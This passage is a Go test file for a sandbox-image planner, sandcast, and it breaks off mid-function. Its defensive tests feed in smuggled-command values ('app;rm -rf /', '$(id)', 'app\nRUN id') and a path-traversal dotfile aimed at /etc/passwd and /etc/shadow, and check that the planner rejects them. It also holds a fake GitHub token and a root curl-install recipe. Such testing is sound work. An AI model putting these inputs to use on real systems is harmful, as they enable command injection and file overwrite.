package plan

import (
	"bytes"
	"errors"
	"os"
	"strings"
	"testing"
	"testing/fstest"

	"github.com/goccy/go-yaml"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/rhuss/sandcast"
	"github.com/rhuss/sandcast/internal/component"
	"github.com/rhuss/sandcast/internal/manifest"
	"github.com/rhuss/sandcast/internal/mise"
	"github.com/rhuss/sandcast/internal/policy"
	"github.com/rhuss/sandcast/internal/probe"
	"github.com/rhuss/sandcast/internal/profile"
	"github.com/rhuss/sandcast/internal/testutil"
)

const testDigest = "sha256:0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef"

var testComponents = fstest.MapFS{
	"go.yaml": {Data: []byte(`key: go
name: Go
installer: {mise: {tool: go, version: "1.25", bins: [go, gofmt]}}
check: {command: go version}
image:
  env: {GOPATH: /opt/go}
  dirs: [{path: /opt/go, owner: user}]
  read_write: [/opt/go]
  runtime_globs: [/opt/mise/installs/go/*/bin/*]
profiles: [go-proxy]
`)},
	"starship.yaml":        {Data: []byte("key: starship\nname: Starship\ninstaller: {mise: {tool: starship, bins: [starship]}}\ncheck: {command: starship --version}\n")},
	"zsh.yaml":             {Data: []byte("key: zsh\nname: zsh\ninstaller: {package: {packages: {apt-get: [zsh], dnf: [zsh]}, bins: [zsh]}}\ncheck: {command: zsh --version}\n")},
	"git.yaml":             {Data: []byte("key: git\nname: git\ninstaller: {package: {packages: {apt-get: [git]}, bins: [git]}}\ncheck: {command: git --version}\nprofiles: [github]\n")},
	"curl.yaml":            {Data: []byte("key: curl\nname: curl\ninstaller: {package: {packages: {apt-get: [curl]}}}\ncheck: {command: curl --version}\n")},
	"ca-certificates.yaml": {Data: []byte("key: ca-certificates\nname: CA\ninstaller: {package: {packages: {apt-get: [ca-certificates]}}}\ncheck: {command: test -s /etc/ssl/certs/ca-certificates.crt}\nprovides: [update-ca-certificates]\n")},
	"iproute2.yaml":        {Data: []byte("key: iproute2\nname: iproute2\ninstaller: {package: {packages: {apt-get: [iproute2]}, bins: [ip]}}\ncheck: {command: ip -V}\ntargets: [openshell]\n")},
	"nftables.yaml":        {Data: []byte("key: nftables\nname: nftables\ninstaller: {package: {packages: {apt-get: [nftables]}, bins: [nft]}}\ncheck: {command: nft --version}\ntargets: [openshell]\n")},
	"mytool.yaml":          {Data: []byte("key: mytool\nname: mytool\ninstaller: {script: {run: \"curl -fsSL https://example.com/m -o /usr/local/bin/mytool\\nchmod +x /usr/local/bin/mytool\", as_root: true}}\ncheck: {command: mytool --version}\n")},
}

func testManifest() *manifest.Manifest {
	return &manifest.Manifest{
		SchemaVersion: 1,
		Name:          "demo",
		BaseImage:     "nvidia-community-base",
		Components: []manifest.ComponentRef{
			{Key: "go"}, {Key: "starship"}, {Key: "git"}, {Key: "mytool"}, {Key: "unknown-tool", Optional: true},
		},
		Shell:   &manifest.Shell{Program: "zsh", RC: "autoload -Uz compinit && compinit -C\n[[ \"$TERM\" != \"dumb\" ]] && eval \"$(starship init zsh)\"\n"},
		Targets: manifest.Targets{OpenShell: &manifest.Target{Image: "localhost/demo"}},
	}
}

func testProbe(wanted []Wanted) *probe.Result {
	checks := map[string]probe.CheckResult{}
	for _, w := range wanted {
		if w.Def == nil {
			continue
		}
		status := probe.StatusMissing
		version := ""
		if w.Key == "git" || w.Key == "curl" || w.Key == "ca-certificates" {
			status = probe.StatusPresent
			version = "2.43.0"
		}
		checks[w.Key] = probe.CheckResult{ComponentKey: w.Key, Status: status, Version: version}
	}
	return &probe.Result{
		Facts: probe.Facts{
			Digest: testDigest, Reference: "ghcr.io/nvidia/openshell-community/sandboxes/base:latest", Platform: "linux/arm64",
			OS:             probe.OS{ID: "ubuntu", IDLike: "debian", Name: "Ubuntu", Version: "24.04"},
			PackageManager: "apt-get",
			User:           probe.User{Name: "sandbox", UID: 1000, GID: 1000, Group: "sandbox", Home: "/sandbox", Shell: "/bin/bash"},
			Shells:         []string{"/bin/bash", "/bin/sh"},
			ProbedAt:       "2026-10-08T12:00:00Z",
		},
		Checks: checks,
	}
}

func testInputs(t *testing.T, m *manifest.Manifest, stored map[string]StoredFragment) Inputs {
	t.Helper()
	comps, err := component.LoadDir(testComponents, component.TierShipped, "components")
	require.NoError(t, err)
	set := component.NewSet(comps)
	wanted, notices := Select(m, set, manifest.TargetOpenShell, map[string]string{"claude-code": "claude-code"})
	profiles, _, err := profile.Resolve(sandcast.UpstreamProfiles, sandcast.OverlayProfiles, nil)
	require.NoError(t, err)
	lock, err := mise.ReadLock("testdata/mise.lock")
	require.NoError(t, err)
	defaults, err := policy.LoadDefaults(sandcast.Policy)
	require.NoError(t, err)
	entry := "nvidia-community-base"
	return Inputs{
		Manifest:        m,
		Target:          manifest.TargetOpenShell,
		Platform:        Selected{Value: "linux/arm64", Source: "manifest"},
		Engine:          EngineInfo{Name: "podman", Source: "detected"},
		BaseImage:       BaseImage{Input: entry, RegistryEntry: &entry, Reference: "ghcr.io/nvidia/openshell-community/sandboxes/base:latest", Digest: testDigest, Notes: []string{"Ubuntu 24.04"}},
		Probe:           testProbe(wanted),
		Wanted:          wanted,
		Profiles:        profiles,
		Lock:            lock,
		PolicyDefaults:  defaults,
		StoredFragments: stored,
		Notices:         notices,
	}
}

func TestBuildDeterministicAndGolden(t *testing.T) {
	in := testInputs(t, testManifest(), nil)
	p1, err := Build(in)
	require.NoError(t, err)
	p2, err := Build(testInputs(t, testManifest(), nil))
	require.NoError(t, err)
	b1, err := Encode(p1)
	require.NoError(t, err)
	b2, err := Encode(p2)
	require.NoError(t, err)
	assert.True(t, bytes.Equal(b1, b2), "two plans from the same inputs must be byte-identical")
	assert.NotContains(t, string(b1), "2026-10-08T12:00:00Z", "no timestamps in the plan")
	testutil.Golden(t, "testdata/plan.yaml.golden", b1)

	// Decode round trip passes validation.
	back, err := Decode(b1, "plan.yaml")
	require.NoError(t, err)
	assert.Equal(t, p1.Components, back.Components)
}

func TestBuildContent(t *testing.T) {
	p, err := Build(testInputs(t, testManifest(), nil))
	require.NoError(t, err)

	keys := []string{}
	for _, c := range p.Components {
		keys = append(keys, c.Key)
	}
	assert.Equal(t, []string{"ca-certificates", "curl", "git", "go", "iproute2", "mytool", "nftables", "starship", "zsh"}, keys)
	assert.Equal(t, ActionSkip, p.Component("git").Action)
	assert.Equal(t, SectionMise, p.Component("go").FragmentName)
	assert.Equal(t, p.Component("go").Fragment, p.Component("starship").Fragment)
	assert.Equal(t, SectionPackages, p.Component("zsh").FragmentName)
	assert.Contains(t, p.Component("zsh").Fragment, "      iproute2 \\\n      nftables \\\n      zsh \\\n")
	assert.Equal(t, SectionRecipes+"/mytool", p.Component("mytool").FragmentName)
	assert.Contains(t, p.Component("mytool").Fragment, "USER root\nRUN <<'SANDCAST_EOF'")
	assert.True(t, p.Component("iproute2").Implicit)
	assert.Equal(t, []string{"go", "gofmt"}, p.Component("go").Bins)
	assert.Equal(t, "1.25", p.Component("go").Check.Version)

	assert.Equal(t, []Unresolved{{Key: "unknown-tool", Reason: "no component definition in any tier and no stored fragment", Optional: true}}, p.Unresolved)
	assert.Empty(t, p.Blocking())

	ids := []string{}
	for _, pr := range p.Profiles {
		ids = append(ids, pr.ID)
	}
	assert.Equal(t, []string{"github", "go-proxy"}, ids)
	assert.Equal(t, "overlay", p.Profiles[1].Tier)

	assert.Contains(t, p.Mise.TOML, `go = "1.25"`)
	assert.Equal(t, "linux-arm64", p.Mise.Platform)
	assert.Equal(t, LockPathRel, p.Mise.LockPath)
	assert.Contains(t, p.Policy, "/opt/go")
	assert.Contains(t, p.Policy, "run_as_user: sandbox")
	assert.Equal(t, ZshRCPath, p.Shell.RCPath)
	// The relocation env sets ZDOTDIR image-wide for the zsh shell (R3),
	// merged with the component env and sorted by name.
	assert.Equal(t, []EnvVar{{Name: "GOPATH", Value: "/opt/go"}, {Name: "ZDOTDIR", Value: ZDotDir}}, p.Image.Env)
	assert.Equal(t, []Dir{{Path: "/opt/go", Owner: "user"}}, p.Image.Dirs)
	assert.False(t, p.FinalUser.Created)
}

// TestPolicyGrantsRelocationPrefix checks the OpenShell image policy grants
// read access to /opt/sandcast for every shell kind. The upstream default
// policy covers nothing under /opt, so without this grant landlock denies the
// sandbox user the baked rc files and the launchers that are its login shell
// and CMD (verified under a real gateway: "cat /opt/sandcast/bashrc:
// Permission denied").
func TestPolicyGrantsRelocationPrefix(t *testing.T) {
	bash := testManifest()
	bash.Shell = &manifest.Shell{Program: "bash", RC: "alias ll='ls -l'\n"}
	none := testManifest()
	none.Shell = nil
	for name, m := range map[string]*manifest.Manifest{"zsh": testManifest(), "bash": bash, "no shell": none} {
		p, err := Build(testInputs(t, m, nil))
		require.NoError(t, err, name)
		var doc struct {
			FilesystemPolicy struct {
				ReadOnly []string `yaml:"read_only"`
			} `yaml:"filesystem_policy"`
		}
		require.NoError(t, yaml.Unmarshal([]byte(p.Policy), &doc), name)
		assert.Contains(t, doc.FilesystemPolicy.ReadOnly, RelocationPrefix, "%s: the policy grants the baked shell configuration", name)
		require.NoError(t, policy.Validate([]byte(p.Policy)), name)
	}
}

func TestBuildConflicts(t *testing.T) {
	m := testManifest()
	m.Components = append(m.Components, manifest.ComponentRef{Key: "rg-a"}, manifest.ComponentRef{Key: "rg-b"})
	in := testInputs(t, m, nil)
	for _, k := range []string{"rg-a", "rg-b"} {
		def := &component.Component{Key: k, Installer: component.Installer{Script: &component.ScriptInstaller{Run: "true"}}, Provides: []string{"rg"}, Check: component.Check{Command: "rg --version"}}
		in.Wanted = append(in.Wanted, Wanted{Key: k, Ref: manifest.ComponentRef{Key: k}, Def: def})
		in.Probe.Checks[k] = probe.CheckResult{ComponentKey: k, Status: probe.StatusMissing}
	}
	p, err := Build(in)
	require.NoError(t, err)
	assert.Equal(t, []component.Conflict{{Binary: "rg", Components: []string{"rg-a", "rg-b"}}}, p.Conflicts)
}

func TestBuildStoredFragments(t *testing.T) {
	m := testManifest()
	m.Components = append(m.Components, manifest.ComponentRef{Key: "broken-tool"})
	stored := map[string]StoredFragment{
		"broken-tool": {Key: "broken-tool", Source: ".sandcast/fragments/broken-tool.containerfile", Body: "RUN false\n"},
		"mytool":      {Key: "mytool", Source: ".sandcast/fragments/mytool.containerfile", Body: "RUN true\n"},
	}
	p, err := Build(testInputs(t, m, stored))
	require.NoError(t, err)
	c := p.Component("broken-tool")
	require.NotNil(t, c)
	assert.Equal(t, KindFragment, c.InstallerKind)
	assert.Equal(t, SectionFragments+"/broken-tool", c.FragmentName)
	assert.Contains(t, c.Fragment, "RUN false")
	assert.Equal(t, "command -v broken-tool", c.Check.Command)
	assert.Equal(t, "script", p.Component("mytool").InstallerKind, "a recipe wins over a stored fragment")
	joined := strings.Join(p.Notices, "\n")
	assert.Contains(t, joined, "stored fragment .sandcast/fragments/mytool.containerfile is stale")

	stored["broken-tool"] = StoredFragment{Key: "broken-tool", Source: "x", Body: "RUN false\n", Superseded: true}
	p, err = Build(testInputs(t, m, stored))
	require.NoError(t, err)
	assert.Equal(t, []string{"broken-tool"}, keysOf(p.Blocking()))
}

func TestBuildLockErrors(t *testing.T) {
	in := testInputs(t, testManifest(), nil)
	in.Platform = Selected{Value: "linux/amd64", Source: "flag"}
	_, err := Build(in)
	var le *LockError
	require.True(t, errors.As(err, &le), "got %v", err)
	assert.Equal(t, "linux-x64", le.Platform)
	assert.Contains(t, err.Error(), "starship")
	assert.NotContains(t, err.Error(), "go@", "go has a linux-x64 entry")

	in = testInputs(t, testManifest(), nil)
	in.Lock = nil
	_, err = Build(in)
	require.True(t, errors.As(err, &le))
	assert.Contains(t, err.Error(), "sandcast lock")
}

func TestBuildUnknownProfile(t *testing.T) {
	in := testInputs(t, testManifest(), nil)
	for i := range in.Wanted {
		if in.Wanted[i].Key == "go" {
			in.Wanted[i].Def = in.Wanted[i].Def.Clone()
			in.Wanted[i].Def.Profiles = []string{"no-such-profile"}
		}
	}
	_, err := Build(in)
	var re *ReferenceError
	require.True(t, errors.As(err, &re))
	assert.Contains(t, err.Error(), "no-such-profile")
}

func TestBuildRootImageCreatesUser(t *testing.T) {
	in := testInputs(t, testManifest(), nil)
	in.Probe.Facts.User = probe.User{Name: "root", UID: 0, GID: 0, Group: "root", Home: "/root"}
	p, err := Build(in)
	require.NoError(t, err)
	assert.True(t, p.FinalUser.Created)
	assert.Contains(t, p.Policy, "run_as_user: sandbox")
}

func TestPolicyUsesNumericIDsForNamedUsers(t *testing.T) {
	in := testInputs(t, testManifest(), nil)
	in.Probe.Facts.User = probe.User{Name: "node", UID: 1001, GID: 1002, Group: "node", Home: "/home/node"}
	p, err := Build(in)
	require.NoError(t, err)
	assert.Contains(t, p.Policy, `run_as_user: "1001"`)
	assert.Contains(t, p.Policy, `run_as_group: "1002"`)
	assert.Equal(t, "node", p.FinalUser.Name)
}

// TestPolicyRootGroupUsesUID covers the OpenShift style base image user
// (USER 1001 with primary group 0). OpenShell v0.1.3 rejects GID 0 for
// run_as_group, so the policy runs the kept user with its UID as the group.
func TestPolicyRootGroupUsesUID(t *testing.T) {
	for _, group := range []string{"root", ""} {
		in := testInputs(t, testManifest(), nil)
		in.Probe.Facts.User = probe.User{Name: "app", UID: 1001, GID: 0, Group: group, Home: "/opt/app-root/src"}
		p, err := Build(in)
		require.NoError(t, err, "group %q", group)
		assert.Equal(t, "app", p.FinalUser.Name, "the base image user is kept unchanged")
		assert.Equal(t, 1001, p.FinalUser.UID)
		assert.Equal(t, 0, p.FinalUser.GID, "image ownership keeps the base image group")
		assert.Equal(t, "/opt/app-root/src", p.FinalUser.Home)
		assert.False(t, p.FinalUser.Created)
		assert.Contains(t, p.Policy, `run_as_user: "1001"`)
		assert.Contains(t, p.Policy, `run_as_group: "1001"`)
		require.NoError(t, policy.Validate([]byte(p.Policy)))
		assert.Contains(t, strings.Join(p.Notices, "\n"), "primary group 0")
	}

	// A non-root primary group stays as it is and adds no notice.
	in := testInputs(t, testManifest(), nil)
	in.Probe.Facts.User = probe.User{Name: "app", UID: 1001, GID: 1001, Group: "app", Home: "/home/app"}
	p, err := Build(in)
	require.NoError(t, err)
	assert.Contains(t, p.Policy, `run_as_group: "1001"`)
	assert.NotContains(t, strings.Join(p.Notices, "\n"), "primary group 0")
}

// TestBuildRejectsUnsafeUserFacts covers probe facts that are rendered
// unquoted into USER, WORKDIR and install -d: the user name, the group name
// and the home directory come from the base image and are validated.
func TestBuildRejectsUnsafeUserFacts(t *testing.T) {
	ok := probe.User{Name: "app", UID: 1001, GID: 1001, Group: "app", Home: "/home/app"}
	tests := []struct {
		name   string
		mutate func(u *probe.User)
		field  string
	}{
		{"name with a command", func(u *probe.User) { u.Name = "app;rm -rf /" }, "final_user.name"},
		{"name with whitespace", func(u *probe.User) { u.Name = "app user" }, "final_user.name"},
		{"name with a leading hyphen", func(u *probe.User) { u.Name = "-app" }, "final_user.name"},
		{"name with a substitution", func(u *probe.User) { u.Name = "$(id)" }, "final_user.name"},
		{"group with a substitution", func(u *probe.User) { u.Group = "app$(id)" }, "final_user.group"},
		{"group with a newline", func(u *probe.User) { u.Group = "app\nRUN id" }, "final_user.group"},
		{"relative home", func(u *probe.User) { u.Home = "home/app" }, "final_user.home"},
		{"home with whitespace", func(u *probe.User) { u.Home = "/home/app dir" }, "final_user.home"},
		{"home with a newline", func(u *probe.User) { u.Home = "/home/app\nRUN id" }, "final_user.home"},
		{"home with a variable", func(u *probe.User) { u.Home = "/home/$USER" }, "final_user.home"},
		{"home with a traversal", func(u *probe.User) { u.Home = "/home/../etc" }, "final_user.home"},
		{"home with a trailing slash", func(u *probe.User) { u.Home = "/home/app/" }, "final_user.home"},
		{"home with a semicolon", func(u *probe.User) { u.Home = "/home/app;id" }, "final_user.home"},
	}
	for _, target := range []string{manifest.TargetOpenShell, manifest.TargetContainer} {
		for _, tt := range tests {
			t.Run(target+"/"+tt.name, func(t *testing.T) {
				in := testInputs(t, testManifest(), nil)
				in.Target = target
				u := ok
				tt.mutate(&u)
				in.Probe.Facts.User = u
				_, err := Build(in)
				require.Error(t, err)
				assert.Contains(t, err.Error(), tt.field)
			})
		}
	}

	for _, u := range []probe.User{
		ok,
		{Name: "app.user_1-x", UID: 1001, GID: 1001, Group: "app-group", Home: "/opt/app-root/src"},
		{Name: "_svc", UID: 1001, GID: 1001, Group: "_svc", Home: "/var/lib/svc@1+x"},
		{UID: 1001, GID: 1002},
	} {
		in := testInputs(t, testManifest(), nil)
		in.Probe.Facts.User = u
		_, err := Build(in)
		assert.NoError(t, err, "%+v", u)
	}
}

// TestValidateRejectsUnsafeFinalUser covers a hand-edited plan.yaml: build
// reads the final user from the plan file.
func TestValidateRejectsUnsafeFinalUser(t *testing.T) {
	p, err := Build(testInputs(t, testManifest(), nil))
	require.NoError(t, err)
	require.NoError(t, Validate(p))
	p.FinalUser.Home = "/sandbox\nRUN id"
	err = Validate(p)
	require.Error(t, err)
	assert.Contains(t, err.Error(), "final_user.home")
	p.FinalUser.Home = "/sandbox"
	p.FinalUser.Group = "sandbox root"
	err = Validate(p)
	require.Error(t, err)
	assert.Contains(t, err.Error(), "final_user.group")
}

// policyPaths decodes the filesystem paths of a rendered policy.
func policyPaths(t *testing.T, doc string) (readOnly, readWrite []string) {
	t.Helper()
	var d struct {
		FilesystemPolicy struct {
			ReadOnly  []string `yaml:"read_only"`
			ReadWrite []string `yaml:"read_write"`
		} `yaml:"filesystem_policy"`
	}
	require.NoError(t, yaml.Unmarshal([]byte(doc), &d))
	return d.FilesystemPolicy.ReadOnly, d.FilesystemPolicy.ReadWrite
}

// TestBuildFragmentGrantsOptKey covers fragments that unpack trees into
// /opt/<key> as the build skill tells them to: the image policy grants only
// declared /opt paths, so the plan adds /opt/<key> read-only for every
// fragment-installed component.
func TestBuildFragmentGrantsOptKey(t *testing.T) {
	m := testManifest()
	m.Components = append(m.Components, manifest.ComponentRef{Key: "broken-tool"})
	stored := map[string]StoredFragment{
		"broken-tool": {Key: "broken-tool", Source: ".sandcast/fragments/broken-tool.containerfile", Body: "RUN true\n"},
		"zsh":         {Key: "zsh", Source: ".sandcast/fragments/zsh.containerfile", Body: "RUN true\n"},
	}
	in := testInputs(t, m, stored)
	in.Probe.Checks["zsh"] = probe.CheckResult{ComponentKey: "zsh", Status: probe.StatusIncompatible, Version: "5.0"}
	p, err := Build(in)
	require.NoError(t, err)
	require.Equal(t, KindFragment, p.Component("broken-tool").InstallerKind)
	require.Equal(t, KindFragment, p.Component("zsh").InstallerKind)
	ro, rw := policyPaths(t, p.Policy)
	assert.Contains(t, ro, "/opt/broken-tool", "fragment without a definition")
	assert.Contains(t, ro, "/opt/zsh", "fragment for an unresolvable definition")
	assert.NotContains(t, rw, "/opt/broken-tool")
	assert.NotContains(t, ro, "/opt/mytool", "a recipe declares its own image needs")
	assert.NotContains(t, ro, "/opt/starship", "a mise tool installs under /opt/mise")
	require.NoError(t, policy.Validate([]byte(p.Policy)))
}

// TestBuildDeltaEdgeCases runs plan.Build with components whose probe delta
// is unresolvable or shadow.
func TestBuildDeltaEdgeCases(t *testing.T) {
	t.Run("no package manager", func(t *testing.T) {
		in := testInputs(t, testManifest(), nil)
		in.Probe.Facts.PackageManager = PackageManagerNone
		p, err := Build(in)
		require.NoError(t, err)
		var zsh *Unresolved
		for i := range p.Unresolved {
			if p.Unresolved[i].Key == "zsh" {
				zsh = &p.Unresolved[i]
			}
		}
		require.NotNil(t, zsh, "a package component cannot be installed")
		assert.Contains(t, zsh.Reason, "no supported package manager")
		assert.Nil(t, p.Component("zsh"))
		assert.Contains(t, keysOf(p.Blocking()), "zsh")
		// Spec edge case: tool manager installs still proceed.
		require.NotNil(t, p.Component("go"))
		assert.Equal(t, ActionInstall, p.Component("go").Action)
		assert.Equal(t, SectionMise, p.Component("go").FragmentName)
		assert.NotEmpty(t, p.Component("go").Fragment)
		assert.Contains(t, p.Mise.TOML, `go = "1.25"`)
		assert.Equal(t, SectionRecipes+"/mytool", p.Component("mytool").FragmentName, "recipes still proceed")
		assert.Equal(t, ActionSkip, p.Component("git").Action, "a present package needs no package manager")
	})

	t.Run("incompatible mise tool is shadowed", func(t *testing.T) {
		in := testInputs(t, testManifest(), nil)
		in.Probe.Checks["go"] = probe.CheckResult{ComponentKey: "go", Status: probe.StatusIncompatible, Version: "1.20.0"}
		p, err := Build(in)
		require.NoError(t, err)
		require.NotNil(t, p.Component("go"))
		assert.Equal(t, ActionShadow, p.Component("go").Action)
		assert.Equal(t, SectionMise, p.Component("go").FragmentName)
		assert.Contains(t, p.Mise.TOML, `go = "1.25"`)
		assert.Contains(t, p.ProbeDelta, DeltaEntry{ComponentKey: "go", Status: "incompatible", InstalledVersion: "1.20.0", RequiredVersion: "1.25", Action: ActionShadow})
		assert.NotContains(t, keysOf(p.Unresolved), "go")
	})

	t.Run("incompatible package covered by a stored fragment", func(t *testing.T) {
		stored := map[string]StoredFragment{
			"zsh": {Key: "zsh", Source: ".sandcast/fragments/zsh.containerfile", Body: "RUN true\n"},
		}
		in := testInputs(t, testManifest(), stored)
		in.Probe.Checks["zsh"] = probe.CheckResult{ComponentKey: "zsh", Status: probe.StatusIncompatible, Version: "5.0"}
		p, err := Build(in)
		require.NoError(t, err)
		c := p.Component("zsh")
		require.NotNil(t, c)
		assert.Equal(t, KindFragment, c.InstallerKind)
		assert.Equal(t, ActionInstall, c.Action)
		assert.Equal(t, SectionFragments+"/zsh", c.FragmentName)
		assert.Equal(t, "zsh --version", c.Check.Command, "the definition's check is kept")
		assert.NotContains(t, keysOf(p.Unresolved), "zsh")
		assert.NotContains(t, p.Component("iproute2").Fragment, "zsh", "the package section does not install it")
		assert.Contains(t, p.ProbeDelta, DeltaEntry{ComponentKey: "zsh", Status: "incompatible", InstalledVersion: "5.0", Action: ActionUnresolvable})
	})
}

func TestContainerTargetHasNoPolicy(t *testing.T) {
	m := testManifest()
	m.Targets = manifest.Targets{Container: &manifest.Target{Image: "localhost/demo-plain"}}
	in := testInputs(t, m, nil)
	comps, err := component.LoadDir(testComponents, component.TierShipped, "components")
	require.NoError(t, err)
	in.Target = manifest.TargetContainer
	in.Wanted, _ = Select(m, component.NewSet(comps), manifest.TargetContainer, map[string]string{"claude-code": "claude-code"})
	p, err := Build(in)
	require.NoError(t, err)
	assert.Empty(t, p.Policy)
	assert.Nil(t, p.Component("iproute2"))
	assert.Nil(t, p.Component("nftables"))
}

func TestWriteOutputs(t *testing.T) {
	p, err := Build(testInputs(t, testManifest(), nil))
	require.NoError(t, err)
	dir := t.TempDir()
	lock, err := os.ReadFile("testdata/mise.lock")
	require.NoError(t, err)
	require.NoError(t, WriteOutputs(dir, p, lock))
	for _, f := range []string{"plan.yaml", "mise/mise.toml", "mise/mise.lock", "mise/sandcast-mise.sh", "policy.yaml"} {
		_, err := os.Stat(dir + "/" + f)
		assert.NoError(t, err, f)
	}
	loaded, err := Load(dir + "/plan.yaml")
	require.NoError(t, err)
	assert.Equal(t, p.Target, loaded.Target)
}

func TestRelocationEnvForZshAndBash(t *testing.T) {
	zsh := &Plan{Shell: Shell{Program: "zsh"}}
	assert.Equal(t, []EnvVar{{Name: "ZDOTDIR", Value: ZDotDir}}, RelocationEnv(zsh))
	// bash relocates through the launcher, not an env var, so no ZDOTDIR.
	bash := &Plan{Shell: Shell{Program: "bash"}}
	assert.Empty(t, RelocationEnv(bash))
	// per-dotfile env is merged and sorted.
	zsh.Dotfiles = []DotfileSelection{{Env: map[string]string{"STARSHIP_CONFIG": "/etc/xdg/starship.toml"}}}
	assert.Equal(t, []EnvVar{
		{Name: "STARSHIP_CONFIG", Value: "/etc/xdg/starship.toml"},
		{Name: "ZDOTDIR", Value: ZDotDir},
	}, RelocationEnv(zsh))
}

// TestRelocationEnvWinsOverComponentEnv checks a component or harness cannot
// point a relocation variable back into the overmounted home: the relocation
// value wins, the override is reported, and a startup-file variable whose
// final value lies under the home fails the plan (FINDING-36).
func TestRelocationEnvWinsOverComponentEnv(t *testing.T) {
	in := testInputs(t, testManifest(), nil)
	in.Harnesses = []Harness{{
		Name: "evil", Component: "evil", FragmentName: SectionHarness + "/evil", Fragment: "# 70-harness: evil\nUSER root\n",
		Env: []EnvVar{{Name: "ZDOTDIR", Value: OvermountHome}, {Name: "STARSHIP_CONFIG", Value: OvermountHome + "/.config/starship.toml"}},
	}}
	in.Dotfiles = []DotfileInput{{HostPath: "~/.config/starship.toml", Content: "add_newline = false\n", FromAllowlist: true}}
	p, err := Build(in)
	require.NoError(t, err)
	env := map[string]string{}
	for _, e := range p.Image.Env {
		env[e.Name] = e.Value
	}
	assert.Equal(t, ZDotDir, env["ZDOTDIR"], "the relocation value wins")
	assert.False(t, UnderOvermount(OvermountHome, env["STARSHIP_CONFIG"]), "STARSHIP_CONFIG stays out of the home: %s", env["STARSHIP_CONFIG"])
	var reported int
	for _, n := range p.Notices {
		if strings.Contains(n, "replaced by the relocation value") {
			reported++
		}
	}
	assert.Equal(t, 2, reported, "each override is reported: %v", p.Notices)

	// A startup-file variable that sandcast does not relocate but that would
	// make a shell source a workspace file fails the plan.
	for _, name := range []string{"BASH_ENV", "ENV"} {
		bad := testInputs(t, testManifest(), nil)
		bad.Harnesses = []Harness{{
			Name: "evil", Component: "evil", FragmentName: SectionHarness + "/evil", Fragment: "# 70-harness: evil\nUSER root\n",
			Env: []EnvVar{{Name: name, Value: OvermountHome + "/.bashenv"}},
		}}
		_, err := Build(bad)
		require.Error(t, err, name)
		assert.Contains(t, err.Error(), name)
		assert.Contains(t, err.Error(), OvermountHome)
	}
}

// TestRelocateDotfileNoImageWideXDG checks no dotfile sets XDG_CONFIG_HOME:
// an image-wide value pointing at a root-owned tree made every tool that
// writes its configuration there (gh, helm, glab) fail with EACCES
// (FINDING-39). tmux goes to /etc/tmux.conf, which tmux reads natively,
// generic files to /etc/xdg (in the default XDG_CONFIG_DIRS), and only
// tool-specific variables remain.
func TestRelocateDotfileNoImageWideXDG(t *testing.T) {
	for _, tt := range []struct {
		host, target string
		env          map[string]string
	}{
		{"~/.gitconfig", GitConfigPath, nil},
		{"~/.config/git/config", GitConfigPath, nil},
		{"~/.config/starship.toml", XDGConfigDir + "/starship.toml", map[string]string{"STARSHIP_CONFIG": XDGConfigDir + "/starship.toml"}},
		{"~/.tmux.conf", TmuxConfPath, nil},
		{"~/.config/tmux/tmux.conf", TmuxConfPath, nil},
		{"~/.inputrc", InputRCPath, map[string]string{"INPUTRC": InputRCPath}},
		{"~/.config/ghostty/config", XDGConfigDir + "/ghostty/config", nil},
		{"conf/tool.conf", XDGConfigDir + "/conf/tool.conf", nil},
		{".editorconfig", XDGConfigDir + "/editorconfig", nil},
	} {
		target, env := relocateDotfile(tt.host)
		assert.Equal(t, tt.target, target, tt.host)
		assert.Equal(t, tt.env, env, tt.host)
		assert.NotContains(t, env, "XDG_CONFIG_HOME", tt.host)
	}
}

// TestResolveDotfilesInputrcIncludesSystemDefaults checks the baked inputrc
// keeps the system readline defaults: INPUTRC replaces /etc/inputrc as well
// as ~/.inputrc, so the baked file starts with an include of /etc/inputrc.
func TestResolveDotfilesInputrcIncludesSystemDefaults(t *testing.T) {
	sels, _, _, err := resolveDotfiles([]DotfileInput{{HostPath: "~/.inputrc", Content: "set editing-mode vi\n"}}, OvermountHome)
	require.NoError(t, err)
	require.Len(t, sels, 1)
	assert.Equal(t, "$include /etc/inputrc\nset editing-mode vi\n", sels[0].Content)
	again, _, _, err := resolveDotfiles([]DotfileInput{{HostPath: "~/.inputrc", Content: sels[0].Content}}, OvermountHome)
	require.NoError(t, err)
	assert.Equal(t, sels[0].Content, again[0].Content, "an existing include is not doubled")
}

// TestResolveDotfilesRejectsDotSegments checks a host path with ".." cannot
// produce a target that escapes the relocation tree: safeTargetRe accepts
// "." and ".." segments, so a target must also be clean (FINDING-33).
func TestResolveDotfilesRejectsDotSegments(t *testing.T) {
	sels, _, extra, err := resolveDotfiles([]DotfileInput{
		{HostPath: "~/../../../../etc/passwd", Content: "root::0:0::/:/bin/sh\n"},
		{HostPath: "~/.config/../../x/../../etc/shadow", Content: "x\n"},
	}, OvermountHome)
	require.NoError(t, err)
	assert.Empty(t, sels, "no traversal target is baked")
	assert.Len(t, extra, 2, "%v", extra)
	for _, n := range extra {
		assert.Contains(t, n, "unsafe image path")
	}
}

func TestResolveDotfilesDeterministicAndDedup(t *testing.T) {
	inputs := []DotfileInput{
		{HostPath: "~/.tmux.conf", Content: "set -g mouse on\n"},
		{HostPath: "~/.gitconfig", Content: "[user]\n\temail = a@b.c\n", FromAllowlist: true}, // -> /etc/gitconfig (allowlist)
		{HostPath: "~/.config/git/config", Content: "[core]\n\tpager = less\n"},               // also -> /etc/gitconfig (explicit)
	}
	sels, notices, dedup, err := resolveDotfiles(inputs, OvermountHome)
	require.NoError(t, err)
	var targets []string
	for _, s := range sels {
		targets = append(targets, s.RelocatedTo)
		assert.False(t, UnderOvermount(OvermountHome, s.RelocatedTo), "never baked under the home")
	}
	assert.Equal(t, []string{GitConfigPath, TmuxConfPath}, targets, "sorted by relocated_to")
	// The explicit manifest entry wins the /etc/gitconfig collision.
	assert.Equal(t, "~/.config/git/config", sels[0].HostPath)
	assert.Equal(t, DotfileSourceManifest, sels[0].Source)
	assert.NotEmpty(t, dedup, "a collision is reported")
	assert.Len(t, notices, 2, "one relocated notice per baked dotfile")
	sels2, _, dedup2, _ := resolveDotfiles(inputs, OvermountHome)
	assert.Equal(t, sels, sels2, "deterministic")
	assert.Equal(t, dedup, dedup2)
}

func TestResolveDotfilesRedactsCredential(t *testing.T) {
	token := "ghp_" + strings.Repeat("x", 36)
	inputs := []DotfileInput{{HostPath: "~/.gitconfig", Content: "[github]\n\ttoken = " + token + "\n"}}
